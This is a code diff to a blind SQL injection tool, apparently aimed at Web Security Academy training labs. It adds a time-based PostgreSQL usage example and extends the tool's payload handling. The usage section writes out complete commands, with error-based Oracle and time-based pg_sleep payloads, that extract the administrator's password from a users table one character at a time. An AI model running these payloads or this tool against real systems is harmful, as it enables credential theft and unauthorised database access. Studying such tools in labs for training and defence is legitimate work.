@@ -25,6 +25,9 @@ EXAMPLE:
     
     # Error Based Oracle Injection
     python3 .\blindSQLMan.py -u https://aca51f091e962697c03c01fb00d100b8.web-security-academy.net/filter?category=Gifts -c "TrackingId=AAA^PAYLOAD^; session=9N5D5dTIq3sXCxi2wxFDlxEn4aJXsJ1q" -p "'||(select case when substr(password,1,{2})='{0}{1}' then to_char(1/0) else '' end from users where username='administrator')||'" --dbms oracle --tech E -S 500
+    
+    # Time Based PostgreSQL Injection
+    python3 .\blindSQLMan.py -u https://aca31faf1e531492c019776b00b800f4.web-security-academy.net/filter?category=Pets -c "TrackingId=XXX^PAYLOAD^; session=zAnAGew3uGY3zjirOPFuM6tKnKGQ74eg" -p "'%3BSELECT CASE WHEN (select SUBSTRING(password,1,{2})='{0}{1}' FROM users WHERE username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END---" --tech=T --dbms=PostgreSQL
 '''
 BANNER = '''Y#~!^                                      .~.    
 7@@JG~            ..   :^~?Y?7.            .!5    
@@ -85,9 +88,9 @@ def attack(i, args):
     global pos
     
     args.i = i
-    if args.dbms.title() == 'Mysql':
+    if args.dbms == 'Mysql':
         payload = args.payload.format(prompt, i)
-    if args.dbms.title() == 'Oracle':
+    if args.dbms in ['Oracle', 'PostgreSQL']:
         payload = args.payload.format(prompt, i, pos)
     args.url = args.url.replace('^PAYLOAD^', payload)
     args.data= args.data.replace('^PAYLOAD^', payload)
